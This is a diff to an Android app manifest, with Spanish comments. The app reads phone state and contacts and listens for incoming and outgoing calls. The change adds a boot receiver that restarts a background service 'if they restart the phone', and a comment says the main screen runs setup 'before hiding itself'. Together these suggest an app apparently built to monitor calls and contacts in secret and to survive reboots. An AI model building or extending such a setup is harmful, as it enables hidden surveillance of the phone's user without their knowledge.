@@ -11,13 +11,12 @@
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
 
-    <!-- Permisos de segundo plano, arranque y notificaciones -->
+    <!-- Permisos de segundo plano, arranque, notificaciones y WakeLock -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
     <application
@@ -39,7 +38,19 @@
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
-        <!-- Receptor de eventos de llamadas entrantes/salientes (Estático) -->
+        <!-- Receptor para volver a encender el servicio si reinician el celular -->
+        <receiver
+            android:name=".receiver.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Receptor de eventos de llamadas entrantes/salientes (Estático opcional) -->
         <receiver
             android:name=".receiver.PhoneCallReceiver"
             android:enabled="true"
@@ -48,6 +59,7 @@
                 <action android:name="android.intent.action.PHONE_STATE" />
             </intent-filter>
         </receiver>
+
         <!-- Pantalla Principal (Configuración inicial antes de ocultarse) -->
         <activity
             android:name=".ui.theme.main.MainActivity"
